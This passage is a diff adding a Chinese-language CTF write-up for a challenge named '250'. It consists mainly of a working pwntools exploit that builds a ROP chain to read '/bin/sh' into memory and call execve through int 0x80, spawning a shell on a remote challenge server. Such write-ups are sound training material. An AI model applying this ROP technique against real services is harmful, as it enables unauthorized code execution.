@@ -2780,3 +2780,49 @@ if __name__ == '__main__':
     prnt(0)
     io.interactive()
 ```
+
+### 30. 250
+题目：暂无
+
+思路：常规的栈溢出漏洞。这个程序使用了静态编译，并且去除了sytem函数和/bin/sh字符串，因此通过ROP构造一个read函数读取/bin/sh字符串，然后通过int80调用execute("/bin/sh", 0, 0)获取shell。
+
+全部利用代码如下：
+```python
+from pwn import *
+
+debug = False
+if debug:
+    io = process('./250')
+else:
+    io = remote('220.249.52.134', 30525)
+
+elf = ELF('250')
+
+read_addr = 0x0806D510
+pppr = 0x0806efb9
+pop_eax = 0x080b89e6
+pop_ebx = 0x080481c9
+pop_ecx = 0x080df1b9
+pop_edx = 0x0806efbb
+int80 = 0x0806F5C0
+
+if __name__ == '__main__':
+    # ROP
+    payload = b'A' * 0x3A + b'AAAA'
+    # read(0, bss+500, 8)
+    payload += p32(read_addr) + p32(pppr) + p32(0) + p32(elf.bss()+500) + p32(8)
+
+    # execve("/bin/sh", 0, 0)
+    # execve系统调用号0xb
+    payload += p32(pop_eax) + p32(0xb)
+    payload += p32(pop_ebx) + p32(elf.bss()+500)
+    payload += p32(pop_ecx) + p32(0)
+    payload += p32(pop_edx) + p32(0)
+    payload += p32(int80)
+
+    io.sendlineafter(']', '%d' % len(payload))
+    io.send(payload)
+    sleep(0.1)
+    io.send(b'/bin/sh\x00')
+    io.interactive()
+```
